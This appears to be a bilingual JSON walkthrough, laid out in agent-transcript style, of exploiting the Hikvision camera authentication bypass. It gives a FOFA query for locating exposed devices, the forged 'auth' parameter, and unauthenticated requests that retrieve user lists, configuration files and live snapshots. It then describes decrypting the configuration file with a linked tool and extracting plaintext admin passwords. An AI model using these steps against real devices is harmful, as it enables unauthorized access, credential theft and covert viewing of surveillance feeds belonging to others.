@@ -1,0 +1,232 @@
+{
+  "_source_md":  "Binfiles/2021-06-29-Hikvision-BinConfigurationFiles-decrypter.md",
+  "version": "1.0",
+  "title": {
+    "zh": "海康威视配置文件未授权访问与解密",
+    "en": "Hikvision Configuration Files Unauthorized Access and Decryption"
+  },
+  "description": {
+    "zh": "本文档记录了海康威视监控设备管理后台存在的未授权访问漏洞，通过构造特定auth参数可绕过登录，获取所有用户列表、下载加密配置文件并进行解密，最终提取明文凭据，同时还可获取监控快照。",
+    "en": "This document details an unauthorized access vulnerability in Hikvision surveillance device management backends. By crafting a specific 'auth' parameter, login can be bypassed to retrieve user lists, download encrypted configuration files, decrypt them to obtain plaintext credentials, and capture device snapshots."
+  },
+  "steps": [
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "资产发现与指纹识别",
+        "en": "Asset Discovery and Fingerprinting"
+      },
+      "annotation": {
+        "zh": "使用FOFA搜索引擎语法定位公网暴露的海康威视视频监控设备。",
+        "en": "Use FOFA search syntax to locate publicly exposed Hikvision video surveillance devices."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "FOFA搜索语法",
+            "en": "FOFA Search Query"
+          },
+          "code": "app=\"HIKVISION-视频监控\"",
+          "language": "text"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "生成绕过认证的`Base64`参数",
+        "en": "Generate `Base64` Parameter for Authentication Bypass"
+      },
+      "annotation": {
+        "zh": "漏洞利用的关键在于构造特定格式的auth参数。对字符串 'admin:11' 进行Base64编码，该值用于后续所有未授权请求。",
+        "en": "The key to exploiting the vulnerability is crafting a specific 'auth' parameter. Base64-encode the string 'admin:11', which will be used in all subsequent unauthorized requests."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "生成Base64认证参数",
+            "en": "Generate Base64 Auth Parameter"
+          },
+          "code": "echo admin:11 | base64\nYWRtaW46MTEK",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "检索所有用户及其角色列表",
+        "en": "Retrieve List of All Users and Their Roles"
+      },
+      "annotation": {
+        "zh": "通过未授权接口获取设备上所有用户的详细信息，包括用户名、优先级、IP/MAC地址及用户级别。",
+        "en": "Fetch detailed information of all users on the device via the unauthorized interface, including username, priority, IP/MAC address, and user level."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "未授权用户列表请求示例",
+            "en": "Unauthorized User List Request Example"
+          },
+          "code": "GET /Security/users?auth=YWRtaW46MTEK",
+          "language": "http"
+        },
+        {
+          "caption": {
+            "zh": "返回的XML用户信息示例",
+            "en": "Example XML Response with User Information"
+          },
+          "code": "<UserList version=\"1.0\">\n<User version=\"1.0\">\n<id>1</id>\n<userName>admin</userName>\n<priority>high</priority>\n<ipAddress>0.0.0.0</ipAddress>\n<macAddress>00:00:00:00:00:00</macAddress>\n<userLevel>Administrator</userLevel>\n</User>\n</UserList>",
+          "language": "xml"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "下载加密的账号密码配置文件",
+        "en": "Download Encrypted Configuration File Containing Credentials"
+      },
+      "annotation": {
+        "zh": "通过未授权接口下载设备的配置文件。该文件为PGP加密格式，需进一步解密才能获得明文凭据。",
+        "en": "Download the device's configuration file via the unauthorized interface. The file is in PGP encrypted format and requires further decryption to obtain plaintext credentials."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "配置文件下载请求示例",
+            "en": "Configuration File Download Request Example"
+          },
+          "code": "GET /System/configurationFile?auth=YWRtaW46MTEK",
+          "language": "http"
+        },
+        {
+          "caption": {
+            "zh": "下载文件类型识别",
+            "en": "Downloaded File Type Identification"
+          },
+          "code": "file configurationFile\nconfigurationFile: PGP Secret Key -",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "tool_result",
+      "content": "![解密工具界面截图](https://image.isisy.com/images/2022/02/20/l5mtUa13gvqVHLF.png)",
+      "toolName": "Hikvision_Decrypter_GUI_Screenshot"
+    },
+    {
+      "type": "assistant_text",
+      "content": {
+        "zh": "配置文件解密工具使用说明",
+        "en": "Configuration File Decryption Tool Usage Instructions"
+      },
+      "annotation": {
+        "zh": "下载的配置文件需使用Windows平台下的专用工具 hikvision-decrypter.exe 进行解密。按照步骤打开文件、解密数据并保存解密后的配置文件。",
+        "en": "The downloaded configuration file must be decrypted using the dedicated tool 'hikvision-decrypter.exe' on Windows. Follow the steps to open the file, decrypt the data, and save the decrypted configuration file."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "解密工具操作流程",
+            "en": "Decryption Tool Workflow"
+          },
+          "code": "Open Configuration File -> \nEncrypted -> \nDecrypt Data(Decrypting AES...) -> \n(Successfully decrypted data) -> \nSave Configuration File.",
+          "language": "text"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "从解密数据中提取明文密码",
+        "en": "Extract Plaintext Password from Decrypted Data"
+      },
+      "annotation": {
+        "zh": "使用十六进制编辑器（如010 Editor）打开解密后的文件，搜索字符串 'admin' 即可找到对应的明文密码（例如 admin:asdf1234）。",
+        "en": "Open the decrypted file with a hex editor (e.g., 010 Editor) and search for the string 'admin' to locate the corresponding plaintext password (e.g., admin:asdf1234)."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "搜索明文凭据示例",
+            "en": "Example of Searching for Plaintext Credentials"
+          },
+          "code": "Search String: admin\nFound Credential: admin:asdf1234",
+          "language": "text"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "获取监控实时快照",
+        "en": "Capture Real-time Surveillance Snapshot"
+      },
+      "annotation": {
+        "zh": "通过未授权接口直接获取当前监控画面的快照图片，无需登录。",
+        "en": "Directly capture a snapshot of the current surveillance feed via an unauthorized interface without logging in."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "快照获取请求示例",
+            "en": "Snapshot Retrieval Request Example"
+          },
+          "code": "GET /onvif-http/snapshot?auth=YWRtaW46MTEK",
+          "language": "http"
+        }
+      ]
+    },
+    {
+      "type": "tool_result",
+      "content": "![监控快照示例](https://image.isisy.com/images/2022/02/20/GPEeKkcqsAFRDYO.png)",
+      "toolName": "Hikvision_Snapshot_Example"
+    },
+    {
+      "type": "assistant_text",
+      "content": {
+        "zh": "相关工具与资源链接",
+        "en": "Related Tools and Resources"
+      },
+      "annotation": {
+        "zh": "本文档涉及的工具下载及参考链接汇总。",
+        "en": "Summary of tool downloads and reference links mentioned in this document."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "解密工具可执行文件",
+            "en": "Decryption Tool Executable"
+          },
+          "code": "https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Hikvision%20Unauth/hikvision-decrypter.exe",
+          "language": "text"
+        },
+        {
+          "caption": {
+            "zh": "解密工具源代码仓库",
+            "en": "Decryption Tool Source Repository"
+          },
+          "code": "https://github.com/WormChickenWizard/hikvision-decrypter",
+          "language": "text"
+        },
+        {
+          "caption": {
+            "zh": "加密配置文件样本",
+            "en": "Encrypted Configuration File Sample"
+          },
+          "code": "https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Hikvision%20Unauth/configurationFile-fofa",
+          "language": "text"
+        },
+        {
+          "caption": {
+            "zh": "解密后的配置文件样本",
+            "en": "Decrypted Configuration File Sample"
+          },
+          "code": "https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Hikvision%20Unauth/DE-configurationFile-fofa",
+          "language": "text"
+        }
+      ]
+    }
+  ]
+}
